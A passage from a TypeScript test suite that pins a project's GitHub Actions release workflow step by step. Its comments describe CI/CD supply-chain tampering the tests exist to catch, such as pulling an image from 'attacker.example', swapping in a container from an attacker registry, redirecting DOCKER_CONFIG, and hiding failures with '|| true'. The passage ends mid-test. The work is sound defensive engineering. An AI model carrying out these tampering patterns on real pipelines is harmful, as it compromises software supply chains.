  // backslash, nothing after it) continues onto the next line; `foo \ `
  // (backslash then a trailing space) does not -- the backslash escapes the
  // space into a literal one, the line ends there, and what follows becomes
  // a separate command. Stripping that one space made the two
  // indistinguishable after normalisation, so a mutation turning a real
  // continuation into a broken one -- proven: `git push "…deploys.git" \ `
  // called `git` with a bogus third argument and exited 127 -- compared
  // equal to the correct original and the pin missed it. Every *other*
  // trailing space is genuinely inert in shell and is still stripped.
  return script
    .split("\n")
    .map((line) => (/\\[ \t]+$/.test(line) ? line : line.replace(/[ \t]+$/, "")))
    .join("\n");
}

/**
 * Pins `name`.`id`'s steps to `expected`, exactly: the same number of steps,
 * each one's `run:` body byte-identical after `normalizeRun`, and every
 * other key -- read via object rest, so a key this fixture does not name is
 * exactly as much a failure as one with the wrong value -- deep-equal.
 */
function expectStepsPinnedExactly(
  name: string,
  id: string,
  expected: ReadonlyArray<{ readonly [key: string]: YamlValue }>,
): void {
  const actual = steps(name, id);
  expect(actual, `${name}.${id} has a different number of steps than the pin expects`).toHaveLength(
    expected.length,
  );
  actual.forEach((step, index) => {
    const path = `${name}.${id}.steps[${index}]`;
    const { run: expectedRun, ...expectedRest } = expected[index]!;
    const { run: actualRun, ...actualRest } = step;
    if (expectedRun === undefined) {
      expect(actualRun, `${path} gained a run: body absent from the pin`).toBeUndefined();
    } else {
      expect(
        normalizeRun(asScalar(actualRun!, `${path}.run`)),
        `${path}'s run: body no longer matches the pinned fixture`,
      ).toBe(normalizeRun(asScalar(expectedRun, "expected run")));
    }
    expect(actualRest, `${path}'s non-run: keys no longer match the pinned fixture`).toEqual(
      expectedRest,
    );
  });
}

// prettier-ignore
const VALIDATE_STEPS: ReadonlyArray<{ readonly [key: string]: YamlValue }> = [
  {
    "name": "Check out the pushed revision",
    "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    "with": {
      "fetch-depth": "0",
      "persist-credentials": "false"
    }
  },
  {
    "name": "Set up Node",
    "uses": "actions/setup-node@820762786026740c76f36085b0efc47a31fe5020",
    "with": {
      "node-version": "24.20.0"
    }
  },
  {
    "name": "Install locked dependencies",
    "run": "npm ci"
  },
  {
    "name": "Install lychee",
    "env": {
      "LYCHEE_VERSION": "0.24.2",
      "LYCHEE_SHA256": "1f4e0ef7f6554a6ed33dd7ac144fb2e1bbed98598e7af973042fc5cd43951c9a"
    },
    "run": "set -euo pipefail\narchive=\"${RUNNER_TEMP}/lychee.tar.gz\"\ncurl --fail --silent --show-error --location --output \"$archive\" \\\n  \"https://github.com/lycheeverse/lychee/releases/download/lychee-v${LYCHEE_VERSION}/lychee-x86_64-unknown-linux-gnu.tar.gz\"\necho \"${LYCHEE_SHA256}  ${archive}\" | sha256sum --check --strict\ntar -xzf \"$archive\" -C \"${RUNNER_TEMP}\" --strip-components=1 \\\n  lychee-x86_64-unknown-linux-gnu/lychee\nsudo mv \"${RUNNER_TEMP}/lychee\" /usr/local/bin/lychee"
  },
  {
    "name": "Install gitleaks",
    "env": {
      "GITLEAKS_VERSION": "8.30.1",
      "GITLEAKS_SHA256": "551f6fc83ea457d62a0d98237cbad105af8d557003051f41f3e7ca7b3f2470eb"
    },
    "run": "set -euo pipefail\narchive=\"${RUNNER_TEMP}/gitleaks.tar.gz\"\ncurl --fail --silent --show-error --location --output \"$archive\" \\\n  \"https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz\"\necho \"${GITLEAKS_SHA256}  ${archive}\" | sha256sum --check --strict\ntar -xzf \"$archive\" -C \"${RUNNER_TEMP}\" gitleaks\nsudo mv \"${RUNNER_TEMP}/gitleaks\" /usr/local/bin/gitleaks"
  },
  {
    "name": "Run canonical validation",
    "run": "set -euo pipefail\nbash scripts/validate"
  },
];

// prettier-ignore
const GATE_STEPS: ReadonlyArray<{ readonly [key: string]: YamlValue }> = [
  {
    "name": "Read the digest guard from the pushed revision",
    "id": "verify",
    "env": {
      "GITHUB_TOKEN": "${{ github.token }}",
      "REPOSITORY": "${{ github.repository }}",
      "SOURCE_SHA": "${{ github.sha }}",
    },
    "run": "set -euo pipefail\napi='https://api.github.com'\nheaders=(\n  --header \"Authorization: Bearer $GITHUB_TOKEN\"\n  --header 'Accept: application/vnd.github+json'\n  --header 'X-GitHub-Api-Version: 2022-11-28'\n)\n\nprintf '%s' \"$SOURCE_SHA\" | grep -Eq '^[0-9a-f]{40}$'\n\n# Read rather than check out. The guard is the one file from this\n# repository the credentialed job executes, and fetching it as bytes\n# is what keeps that job free of a working tree it could run\n# anything else from.\nguard_response=\"$(curl --fail --silent --show-error \"${headers[@]}\" \\\n  \"${api}/repos/${REPOSITORY}/contents/scripts/update-gitops-digest.sh?ref=${SOURCE_SHA}\")\"\njq -e '\n  .type == \"file\" and\n  .encoding == \"base64\" and\n  (.content | type == \"string\")\n' >/dev/null <<<\"$guard_response\"\nguard=\"$RUNNER_TEMP/update-gitops-digest.sh\"\ntrap 'rm -f -- \"$guard\"' EXIT\njq -er '.content | gsub(\"\\\\n\"; \"\")' <<<\"$guard_response\" \\\n  | base64 --decode >\"$guard\"\ngrep -qx '#!/bin/sh' \"$guard\"\nguard_content=\"$(base64 --wrap=0 \"$guard\")\"\n\necho \"source_sha=$SOURCE_SHA\" >>\"$GITHUB_OUTPUT\"\necho \"guard=$guard_content\" >>\"$GITHUB_OUTPUT\"",
  },
];

// prettier-ignore
const PROMOTE_STEPS: ReadonlyArray<{ readonly [key: string]: YamlValue }> = [
  {
    "name": "Mint repository-scoped GitHub App token",
    "id": "app-token",
    "env": {
      "APP_CLIENT_ID": "${{ secrets.LOUSYDEAL_DEPLOYER_CLIENT_ID }}",
      "APP_PRIVATE_KEY": "${{ secrets.LOUSYDEAL_DEPLOYER_PRIVATE_KEY }}",
    },
    "run": "set -euo pipefail\numask 077\nkey=\"$RUNNER_TEMP/lousydeal-deployer.pem\"\ntrap 'rm -f -- \"$key\"' EXIT\nprintf '%s' \"$APP_PRIVATE_KEY\" >\"$key\"\n\nb64url() {\n  openssl base64 -A | tr '+/' '-_' | tr -d '='\n}\nnow=\"$(date +%s)\"\nheader=\"$(printf '%s' '{\"alg\":\"RS256\",\"typ\":\"JWT\"}' | b64url)\"\npayload=\"$(jq -cn --arg iss \"$APP_CLIENT_ID\" \\\n  --argjson iat \"$((now - 60))\" --argjson exp \"$((now + 540))\" \\\n  '{iat:$iat,exp:$exp,iss:$iss}' | b64url)\"\nunsigned=\"${header}.${payload}\"\nsignature=\"$(printf '%s' \"$unsigned\" \\\n  | openssl dgst -sha256 -sign \"$key\" -binary | b64url)\"\njwt=\"${unsigned}.${signature}\"\ngithub_api=https://api.github.com\nrepository=hannosirkel/deploys\n\ninstallation_id=\"$(curl --fail --silent --show-error \\\n  --header \"Authorization: Bearer $jwt\" \\\n  --header 'Accept: application/vnd.github+json' \\\n  --header 'X-GitHub-Api-Version: 2022-11-28' \\\n  \"${github_api}/repos/${repository}/installation\" \\\n  | jq -er '.id')\"\ntoken=\"$(curl --fail --silent --show-error --request POST \\\n  --header \"Authorization: Bearer $jwt\" \\\n  --header 'Accept: application/vnd.github+json' \\\n  --header 'X-GitHub-Api-Version: 2022-11-28' \\\n  --header 'Content-Type: application/json' \\\n  --data '{\"repositories\":[\"deploys\"]}' \\\n  \"${github_api}/app/installations/${installation_id}/access_tokens\" \\\n  | jq -er '.token')\"\necho \"::add-mask::$token\"\necho \"token=$token\" >>\"$GITHUB_OUTPUT\"",
  },
  {
    "name": "Check out only the GitOps state",
    "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    "with": {
      "repository": "hannosirkel/deploys",
      "token": "${{ steps.app-token.outputs.token }}",
      "path": "gitops",
      "persist-credentials": "false",
    },
  },
  {
    "name": "Apply the exact live image digests",
    "env": {
      "GUARD_CONTENT": "${{ needs.gate.outputs.guard }}",
    },
    "run": "set -euo pipefail\nguard=\"$RUNNER_TEMP/update-gitops-digest.sh\"\nprintf '%s' \"$GUARD_CONTENT\" | base64 --decode >\"$guard\"\nchmod 0700 \"$guard\"\n\"$guard\" \"$BACKEND_DIGEST\" \"$STOREFRONT_DIGEST\" \"$GITHUB_WORKSPACE/gitops/lousydeal/overlays/live\"",
  },
  {
    "name": "Commit and push the GitOps update",
    "env": {
      "APP_TOKEN": "${{ steps.app-token.outputs.token }}",
    },
    "working-directory": "gitops",
    "run": "set -euo pipefail\ngit config user.name 'lousydeal-deployer[bot]'\ngit config user.email \\\n  'lousydeal-deployer[bot]@users.noreply.github.com'\nbash lousydeal/tests/manifests.sh\nkubectl kustomize lousydeal/overlays/live >/dev/null\nkubectl kustomize lousydeal/overlays/test >/dev/null\ngit diff --check\ngit add lousydeal/overlays/live/kustomization.yaml\nstaged=\"$(git diff --cached --name-only)\"\nif [ -z \"$staged\" ]; then\n  echo 'live overlay already records both digests: nothing to promote'\n  exit 0\nfi\n[ \"$staged\" = 'lousydeal/overlays/live/kustomization.yaml' ]\ngit diff --cached --check\ngit commit -m \\\n  \"deploy(live): ${SOURCE_SHA} ${BACKEND_DIGEST} ${STOREFRONT_DIGEST}\"\ngit push \"https://x-access-token:${APP_TOKEN}@github.com/hannosirkel/deploys.git\" \\\n  HEAD:main",
  },
];

// prettier-ignore
const BUILD_STEPS: ReadonlyArray<{ readonly [key: string]: YamlValue }> = [
  {
    "name": "Check out the validated revision",
    "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    "with": {
      "ref": "${{ needs.gate.outputs.source_sha }}",
      "persist-credentials": "false",
    },
  },
  {
    "name": "Set up the attestation-capable Buildx driver",
    "uses": "docker/setup-buildx-action@bb05f3f5519dd87d3ba754cc423b652a5edd6d2c",
  },
  {
    "name": "Authenticate to GHCR",
    "env": {
      "GHCR_TOKEN": "${{ github.token }}",
    },
    "run": "set -euo pipefail\nprintf '%s' \"$GHCR_TOKEN\" | docker login ghcr.io \\\n  --username \"${GITHUB_ACTOR}\" --password-stdin",
  },
  {
    "name": "Build and publish both images",
    "id": "build",
    "env": {
      "BACKEND_IMAGE": "ghcr.io/hannosirkel/lousydeal-backend",
      "STOREFRONT_IMAGE": "ghcr.io/hannosirkel/lousydeal-storefront",
      "SOURCE_URL": "https://github.com/hannosirkel/lousydeal",
    },
    "run": "set -euo pipefail\npublish() {\n  image=\"$1\"\n  dockerfile=\"$2\"\n  output=\"$3\"\n  metadata=\"$RUNNER_TEMP/${output}.json\"\n  docker buildx build --platform linux/amd64 \\\n    --provenance=mode=min --sbom=true \\\n    --label \"org.opencontainers.image.source=$SOURCE_URL\" \\\n    --file \"$dockerfile\" \\\n    --tag \"${image}:sha-${SOURCE_SHA}\" \\\n    --push --metadata-file \"$metadata\" .\n  digest=\"$(jq -er '.\"containerimage.digest\"' \"$metadata\")\"\n  # The digest guard: what a promotion is allowed to carry forward\n  # is a content digest, never a floating tag. This is the one\n  # place that value is produced, so it is the one place refusing a\n  # malformed value stops it from ever reaching `promote`.\n  printf '%s' \"$digest\" | grep -Eq '^sha256:[0-9a-f]{64}$'\n  echo \"${output}=$digest\" >>\"$GITHUB_OUTPUT\"\n}\npublish \"$BACKEND_IMAGE\" backend/Dockerfile backend_digest\npublish \"$STOREFRONT_IMAGE\" storefront/Dockerfile storefront_digest",
  },
  {
    "name": "Scan the published backend digest",
    "uses": "aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25",
    "with": {
      "image-ref": "ghcr.io/hannosirkel/lousydeal-backend@${{ steps.build.outputs.backend_digest }}",
      "format": "json",
      "output": "trivy-backend.json",
      "exit-code": "1",
      "ignore-unfixed": "true",
      "vuln-type": "os,library",
      "severity": "CRITICAL",
      "scanners": "vuln",
      "version": "v0.70.0",
    },
  },
  {
    "name": "Scan the published storefront digest",
    "uses": "aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25",
    "with": {
      "image-ref": "ghcr.io/hannosirkel/lousydeal-storefront@${{ steps.build.outputs.storefront_digest }}",
      "format": "json",
      "output": "trivy-storefront.json",
      "exit-code": "1",
      "ignore-unfixed": "true",
      "vuln-type": "os,library",
      "severity": "CRITICAL",
      "scanners": "vuln",
      "version": "v0.70.0",
    },
  },
  {
    "name": "Retain the vulnerability reports",
    "if": "${{ always() && hashFiles('trivy-backend.json', 'trivy-storefront.json') != '' }}",
    "uses": "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
    "with": {
      "name": "trivy-live-${{ needs.gate.outputs.source_sha }}",
      "path": "trivy-backend.json\ntrivy-storefront.json",
      "if-no-files-found": "error",
      "retention-days": "7",
    },
  },
];

describe("Release's trigger and concurrency", () => {
  it("fires only on a push to main", () => {
    const document = workflow(RELEASE);
    expect(document["name"]).toBe("Release");
    const on = asMapping(document["on"]!, "on");
    expect(Object.keys(on)).toEqual(["push"]);
    const push = asMapping(on["push"]!, "push");
    // `Object.keys(on)` closes the trigger set; this closes `push`'s own.
    // `on.push.branches` alone reads one named key and never asks what else
    // is in the mapping, so an added `tags: ['**']` sat beside it entirely
    // unasserted -- and `push` fires on *either* filter it declares, so a
    // tag push neither this test nor `branches: [main]` governs at all
    // becomes a live deployment. `on: push` with no map under it (bare
    // `push:`) would be the widest version of the same hole -- every push to
    // every branch -- so this closes against that too, not only against an
    // explicit `tags:`.
    expect(Object.keys(push)).toEqual(["branches"]);
    expect(asSequence(push["branches"]!, "branches")).toEqual(["main"]);
  });

  it("shares one non-cancelling GitOps promotion lane with Deploy Test", () => {
    // Recorded, not closed (review pass 5): see the identical note on
    // `deploy-test.yml`'s version of this check -- `concurrency:`'s
    // sub-keys are validated by GitHub Actions at workflow-parse time, a
    // stronger and earlier backstop than a check here could add.
    const concurrency = asMapping(workflow(RELEASE)["concurrency"]!, "concurrency");
    expect(concurrency["group"]).toBe("lousydeal-gitops-promotion");
    expect(concurrency["cancel-in-progress"]).toBe("false");
    // Not merely equal to a string: equal to the *other* workflow's, because
    // the point of the group is that the two never write `deploys` at once.
    expect(concurrency["group"]).toBe(
      asMapping(workflow(DEPLOY_TEST)["concurrency"]!, "concurrency")["group"],
    );
  });

  it("grants the workflow no permissions by default", () => {
    expect(asMapping(workflow(RELEASE)["permissions"]!, "permissions")).toEqual({});
  });

  it("cites the branch-protection ruleset its own approval claim depends on", () => {
    // MAJOR 8: "the merge is the approval" is a claim about GitHub-side
    // configuration -- a ruleset -- that no file in this repository can
    // enforce or observe at runtime; Constraint 10 is that an unbounded
    // claim like that does not go in at all. This does not, and cannot,
    // verify the ruleset is still configured -- only that the citation
    // making the claim checkable by a human stays in the file rather than
    // eroding back into an assertion that names nothing.
    const text = source(RELEASE);
    expect(text, "does not name the ruleset by name").toMatch(/main branch protection/);
    expect(text, "does not cite the ruleset by id").toMatch(/21687602/);
  });

  it("does not claim the live GitHub Environment is an approval gate", () => {
    // M7 (review pass 3): "no manual approval step beyond the live GitHub
    // Environment" reads as though the environment is one -- it is not; it
    // scopes secrets to `promote` and records deployments, and approves
    // nothing. The ruleset half of this same paragraph (the test above) is
    // what actually makes "the merge is the approval" true, and stays as
    // written.
    //
    // MAJOR 2 (review pass 4): this test's own comment used to cite
    // `gh api repos/hannosirkel/lousydeal/environments/live` returning
    // `"protection_rules":[]` -- true when written, false after the
    // operator added a deployment branch policy on the reviewer's own
    // recommendation. The conclusion ("approves nothing") still holds -- a
    // branch policy restricts *which* branch may deploy, not *who*
    // approves the deployment -- but that citation aged out from under it.
    // Not repeated here now, on purpose: `release.yml`'s own header names
    // the date it was read and what it found, which is the one place in
    // this repository that claim needs to live. Asserted here instead is
    // only what does not drift on its own -- that the file does not walk
    // the claim back into an overclaim.
    const text = source(RELEASE);
    expect(
      text,
      "still frames the live GitHub Environment as an approval step",
    ).not.toMatch(/no manual approval step beyond/);
  });
});

describe("Release's job permissions", () => {
  const expected: ReadonlyArray<readonly [string, Record<string, string>]> = [
    ["validate", { contents: "read" }],
    ["gate", { contents: "read" }],
    ["build", { contents: "read", packages: "write" }],
    ["promote", {}],
  ];

  it("declares exactly these four jobs", () => {
    expect(Object.keys(jobs(RELEASE))).toEqual(expected.map(([id]) => id));
  });

  for (const [id, permissions] of expected) {
    it(`gives ${id} exactly ${JSON.stringify(permissions)}`, () => {
      expect(asMapping(job(RELEASE, id)["permissions"]!, `${id}.permissions`)).toEqual(
        permissions,
      );
    });
  }

  it("scopes the deployer credential to the promote job's live environment", () => {
    for (const id of ["validate", "gate", "build"]) {
      expect(job(RELEASE, id)["environment"]).toBeUndefined();
      expect(secretsReferenced(RELEASE, id), `${id} references a secret`).toEqual([]);
    }
    expect(job(RELEASE, "promote")["environment"]).toBe("live");
    expect([...new Set(secretsReferenced(RELEASE, "promote"))].sort()).toEqual([
      "secrets.LOUSYDEAL_DEPLOYER_CLIENT_ID",
      "secrets.LOUSYDEAL_DEPLOYER_PRIVATE_KEY",
    ]);
  });

  it("runs every job on the pinned runner image", () => {
    // M-e: `runs-on:` was asserted nowhere. `promote: runs-on: self-hosted`
    // -- the credentialed job moved onto arbitrary infrastructure -- passed
    // every other check in this file. The exact-step pin below closes this
    // for `gate` and `promote` as a side effect of pinning their steps, but
    // `runs-on:` is a job-level key no step pin reaches, so it is asserted
    // directly here, for all four jobs, `build` included.
    for (const id of Object.keys(jobs(RELEASE))) {
      expect(job(RELEASE, id)["runs-on"], `${RELEASE}.${id}`).toBe("ubuntu-24.04");
    }
  });
});

describe("validate, gate, build and promote are pinned to their exact expected content", () => {
  // See the header comment on `VALIDATE_STEPS`/`GATE_STEPS`/`PROMOTE_STEPS`/
  // `BUILD_STEPS` above for why.

  it("validate's six steps match their pinned fixture exactly", () => {
    // Coordinator-caught gap: this pass originally pinned only `gate` and
    // `promote` and left `validate` on the two-spelling `|| true`/`|| exit 0`
    // regex, even though `validate` neutered is the *worse* case -- `build`
    // and `promote` both `needs: validate`, so a `validate` that always
    // reports green regardless of what it actually found removes the one
    // check standing in front of both. `bash scripts/validate || :`,
    // `|| echo skipped`, and a step-level `if: ${{ false }}` on "Run
    // canonical validation" all left the regex-based checks green at
    // 207/207; pinning closes all three by construction, the same way it
    // closed the eleven failure-swallow spellings on `gate` and `promote`.
    expectStepsPinnedExactly(RELEASE, "validate", VALIDATE_STEPS);
  });

  it("gate's one step matches its pinned fixture exactly", () => {
    expectStepsPinnedExactly(RELEASE, "gate", GATE_STEPS);
  });

  it("promote's four steps match their pinned fixture exactly", () => {
    expectStepsPinnedExactly(RELEASE, "promote", PROMOTE_STEPS);
  });

  it("build's seven steps match their pinned fixture exactly", () => {
    // MAJOR 1 (review pass 3): `build` was the one job of four left on
    // property-style checks -- "longer steps, no GitOps credential" was the
    // stated reason -- and that exemption did not hold. `build` holds
    // `packages: write`, is the sole producer of every value `promote`
    // consumes, and all seven of its steps are exactly as base-controlled as
    // the other three jobs'. Concretely, the property check that stood in
    // for a pin here (`GITHUB_OUTPUT_PATTERN`'s uniqueness filter) matched
    // only the literal, quoted spelling `"$GITHUB_OUTPUT"`, so a
    // `trap … >>$GITHUB_OUTPUT` (unquoted) or `tee -a $GITHUB_OUTPUT`
    // survived at 209/209 -- and, executed with `docker` stubbed to fail the
    // storefront build, produced a step that reports success with *both*
    // outputs carrying well-formed, fabricated digests for images that were
    // never built and never scanned. Pinning closes that, and every other
    // property a "longer steps" job can vary in ways a property check
    // cannot enumerate in advance: a backend image built from
    // `storefront/Dockerfile`, a `COPY --from=attacker.example/…` added to
    // either Dockerfile before the build (every digest assertion stays
    // true), a second `docker login` to an attacker registry alongside the
    // real one, `--build-context`/`--secret` added to the build, an extra
    // `:latest` tag published beside the digest, or a step appended that
    // uploads the workspace.
    expectStepsPinnedExactly(RELEASE, "build", BUILD_STEPS);
  });

  it("binds the built digest to the promoted digest, end to end", () => {
    // MAJOR 4: the adjacency check on the publish script (`expectDigest
    // GuardedAndEmittedUnchanged`) proves `assign -> guard -> emit` are
    // consecutive inside `build`, and now proves the guarded emit is the
    // *last* write to each output name. Neither proves the value actually
    // reaches `promote` unchanged -- nothing bound `steps.build.outputs.*`
    // to `jobs.build.outputs.*` to `promote`'s own `env:` to the guard's
    // argv, so a job output silently bound to the wrong image
    // (`backend_digest: ${{ steps.build.outputs.storefront_digest }}`), or a
    // literal, well-shaped digest in `promote`'s `env:` that no build
    // produced and no scanner saw (`BACKEND_DIGEST: sha256:0000…`), passed
    // every check above. This traces the whole chain in one test:
    // `steps.build.outputs.*` -> `jobs.build.outputs.*` -> `promote.env.*`
    // -> the guard's argv (the last link is closed by the exact-step pin
    // above -- `PROMOTE_STEPS[2].run` names `"$BACKEND_DIGEST"` and
    // `"$STOREFRONT_DIGEST"` verbatim as the guard's second and third
    // arguments).
    const buildOutputs = asMapping(job(RELEASE, "build")["outputs"]!, "build.outputs");
    expect(buildOutputs).toEqual({
      backend_digest: "${{ steps.build.outputs.backend_digest }}",
      storefront_digest: "${{ steps.build.outputs.storefront_digest }}",
    });

    const promoteEnv = asMapping(job(RELEASE, "promote")["env"]!, "promote.env");
    expect(promoteEnv).toEqual({
      BACKEND_DIGEST: "${{ needs.build.outputs.backend_digest }}",
      STOREFRONT_DIGEST: "${{ needs.build.outputs.storefront_digest }}",
      SOURCE_SHA: "${{ needs.gate.outputs.source_sha }}",
    });

    // MAJOR 4 (review pass 4): `env` is *in* build's job-key-set allowlist
    // (below), so that check never looks inside it -- `DOCKER_CONFIG: /tmp/
    // attacker-docker-config` (a credential-store redirect reaching
    // `docker buildx build --push`) and `SOURCE_SHA` rebound to
    // `${{ github.ref_name }}` (a mutable ref, the same hole closed on
    // `gate.outputs.source_sha` above) both passed unchanged. Pinned exactly,
    // the same way `promote.env` is.
    const buildEnv = asMapping(job(RELEASE, "build")["env"]!, "build.env");
    expect(buildEnv).toEqual({
      SOURCE_SHA: "${{ needs.gate.outputs.source_sha }}",
    });

    // `gate`'s own outputs, closed the same way: a mutable
    // `source_sha: ${{ github.ref_name }}` here would have `build` check out
    // a branch tip rather than the exact pushed SHA the workflow fired on,
    // and every check that only reads `gate`'s output *name* -- never its
    // value -- would stay green.
    const gateOutputs = asMapping(job(RELEASE, "gate")["outputs"]!, "gate.outputs");
    expect(gateOutputs).toEqual({
      guard: "${{ steps.verify.outputs.guard }}",
      source_sha: "${{ steps.verify.outputs.source_sha }}",
    });
  });
});

/**
 * MAJOR 2 (review pass 3): pinning a job's *steps* guarantees nothing about
 * the job *around* them. `container:`/`services:` were closed on `build`
 * and `promote` and on neither `gate` nor `validate` -- measured: a
 * job-level `container: ghcr.io/attacker/base:latest` on either passed
 * every check in this file. `GATE_STEPS` pins `gate`'s script byte-for-byte,
 * and then every binary that script calls -- `curl`, `jq`, `base64`,
 * `grep`, `bash` itself -- comes from an attacker-chosen image; `gate`'s
 * only product is `outputs.guard`, the base64 blob `promote` decodes,
 * `chmod 0700`s and executes beside the `deploys` write token. Pinning the
 * *text* of a step guarantees nothing about its *result* when the
 * interpreter running it is substituted.
 *
 * The fix generalises rather than adds a second `container`/`services`-only
 * check: every job-level key GitHub Actions recognises --
 * `container`/`services` among them, but also `env`, `timeout-minutes`,
 * `strategy`, `concurrency`, `needs`, `outputs`, `defaults`, `if`,
 * `runs-on`, `permissions`, `environment` -- is closed to an exact,
 * per-job allowlist in one place, rather than checked (or not) piecemeal
 * per job as earlier passes did. An arbitrary `env:` key added to `gate`
 * (which has none in its allowlist at all), `timeout-minutes: 1` on
 * `build`, a `strategy` matrix running `build` twice (making
 * `jobs.build.outputs` nondeterministic), a job-level `concurrency` on
 * `promote`, an extra `needs` on `validate`, and a checkout of
 * `hannosirkel/deploys` folded into `build` via a smuggled key all fail
 * this the same way `container:` does: the job's own key set no longer
 * matches its allowlist.
 *
 * MAJOR 4 (review pass 4) is what this paragraph claimed and did not do: it
 * previously read "an arbitrary env: key on build or gate ... fail this the
 * same way container: does" -- false for `build`, whose allowlist already
 * includes `env` as a *key*, so this check never looks inside it.
 * `DOCKER_CONFIG: /tmp/attacker-docker-config` added to `build.env`, or
 * `SOURCE_SHA` rebound to `${{ github.ref_name }}` there, passed unchanged.
 * The *value* behind each recognised key -- `permissions:` contents,
 * `needs:` targets, `outputs:` mappings, `runs-on:`, `environment:`,
 * job-level `if:` -- is asserted precisely elsewhere in this file, and
 * `build.env` now joins that list, pinned exactly the way `promote.env`
 * already is (`"binds the built digest to the promoted digest, end to
 * end"`, above). This closes what the piecemeal checks it replaced all
 * shared blindly: an unenumerated key, or an unenumerated *value* behind an
 * enumerated key, sitting beside the ones they did look at.
 */
function expectClosedJobKeySet(
  name: string,
  id: string,
  expectedKeys: readonly string[],
): void {
  expect(Object.keys(job(name, id)).sort(), `${name}.${id}`).toEqual([...expectedKeys].sort());
}

describe("every job's top-level key set is closed, in every workflow", () => {
  const RELEASE_JOB_KEYS: ReadonlyArray<readonly [string, readonly string[]]> = [
    ["validate", ["runs-on", "permissions", "steps"]],
    ["gate", ["runs-on", "permissions", "outputs", "steps"]],
    ["build", ["needs", "runs-on", "permissions", "outputs", "env", "steps"]],
    ["promote", ["needs", "runs-on", "environment", "permissions", "env", "steps"]],
  ];
  const DEPLOY_TEST_JOB_KEYS: ReadonlyArray<readonly [string, readonly string[]]> = [
    ["gate", ["if", "runs-on", "permissions", "outputs", "steps"]],
    ["build", ["needs", "runs-on", "permissions", "outputs", "env", "steps"]],
    ["promote", ["needs", "runs-on", "environment", "permissions", "env", "steps"]],
  ];

  for (const [id, keys] of RELEASE_JOB_KEYS) {
    it(`${RELEASE}.${id} declares exactly ${JSON.stringify(keys)}`, () => {
      expectClosedJobKeySet(RELEASE, id, keys);
    });
  }

  for (const [id, keys] of DEPLOY_TEST_JOB_KEYS) {
    it(`${DEPLOY_TEST}.${id} declares exactly ${JSON.stringify(keys)}`, () => {
      expectClosedJobKeySet(DEPLOY_TEST, id, keys);
    });
  }
});

describe("Steps and jobs cannot swallow a failure they are asserted to have", () => {
  // Every check elsewhere in this file establishes that a step or a guard
  // *exists* -- by presence, substring or ordering. None of those establish
  // that the step can *fail*, and `promote` needing `build` needing `gate`
  // (and, in `release.yml`, `validate`) is the only thing standing between a
  // broken guard, an unscanned image, a failed manifest test or a corrupt
  // release/promotion and a live write. `|| true` on the last command of an
  // otherwise-`set -e` script satisfies every presence/substring/ordering
  // check elsewhere in this file while making the step incapable of failing
  // -- `bash scripts/validate || true` is the worst case in `release.yml`,
  // since both `build` and `promote` need `validate` to have actually run
  // and passed. `|| exit 0` on a guard invocation itself does the identical
  // thing by a different spelling: not caught by a `|| true` pattern, and
  // unlike `|| true` it does not even need to sit on a script's last line to
  // force the whole step green, because it terminates the step outright
  // rather than merely un-failing one command. `continue-on-error` does the
  // identical thing one level up, at the step or the job: the guard-step
  // case is worse than it looks, because a *refused* promotion becomes a
  // green run -- the guard fails, nothing is staged, and the "nothing to
  // promote" bare `exit 0` inside `if [ -z "$staged" ]; then … fi` (a real,
  // deliberate no-op path, not this pattern) reports success regardless.
  //
  // M-j (review pass 2): this ban was `release.yml`-only. `deploy-test.yml`
  // runs the identical guard steps -- the same `jq -e` re-verifications, the
  // same digest guard, the same commit-and-push script -- and was outside
  // it entirely; the digest-adjacency check above (`expectDigestGuarded
  // AndEmittedUnchanged`) was already generalised to both workflows, this
  // was not. `deploy-test.yml` is not a file this row may edit, and does not
  // need to be: `everyScript` and `steps` already take a workflow name, so
  // looping both names here closes the gap without touching that file.
  // Excluded: the job-level `if:` check. `deploy-test.yml`'s `gate` carries
  // a legitimate job-level `if:` -- the label/state trigger gate, asserted
  // separately in "Deploy Test's trigger and concurrency" -- so a blanket
  // "no job-level if: anywhere" would fail the file for the reason it
  // exists. `release.yml` declares no job-level `if:` on any job at all
  // (asserted below, `RELEASE`-only, unchanged from before this pass), which
  // is the stronger, workflow-specific property `deploy-test.yml` cannot
  // share.

  /**
   * The one line in `deploy-test.yml` where `|| true` is legitimate:
   * `gate`'s poll for the head SHA's `Validate` run status. `jq -e`'s
   * selector legitimately produces no output while the run has not
   * completed yet, and this `|| true` is what keeps that one, expected,
   * per-iteration case from aborting the retry loop under `set -e` -- the
   * loop's actual gate is the unconditional `[ -n "$conclusion" ]` a few
   * lines later, outside this `|| true` entirely, which still aborts the
   * script if no run ever concludes. Naming it by exact folded-command text,
   * not by file or job, keeps the exclusion as narrow as the line it names:
   * a *second*, unrelated `|| true` anywhere else in `deploy-test.yml` --
   * including elsewhere in this same step -- still fails this check. This is
   * the one place a blanket ban cannot be generalised to `deploy-test.yml`
   * outright: unlike `release.yml`, whose scripts never legitimately
   * tolerate a command's failure at all, `deploy-test.yml`'s retry loop
   * does, by design, and a blind `not.toMatch` over the whole script would
   * either miss real offences (too loose) or fail this genuinely correct
   * line (too strict).
   */
  const DEPLOY_TEST_TOLERATED_RETRY = '\' <<<"$runs" || true)"';

  for (const name of [RELEASE, DEPLOY_TEST]) {
    it(`${name} runs no script that tolerates a command's failure with || true or || exit 0`, () => {
      for (const [where, script] of everyScript(name)) {
        for (const command of commands(script)) {
          if (name === DEPLOY_TEST && command === DEPLOY_TEST_TOLERATED_RETRY) continue;
          expect(
            command,
            `${name} ${where} tolerates a command's failure with || true or || exit 0: ${command}`,
          ).not.toMatch(/\|\|\s*(?:true\b|exit\s+0\b)/);
        }
      }
    });

    it(`${name} declares continue-on-error on no job`, () => {
      for (const [id, body] of Object.entries(jobs(name))) {
        expect(
          asMapping(body, id)["continue-on-error"],
          `${name}.${id} tolerates a failed step, reporting success to needs regardless`,
        ).toBeUndefined();
      }
    });

    it(`${name} declares continue-on-error on no step, including the digest guard step`, () => {
      for (const id of Object.keys(jobs(name))) {
        for (const [index, step] of steps(name, id).entries()) {
          expect(
            step["continue-on-error"],
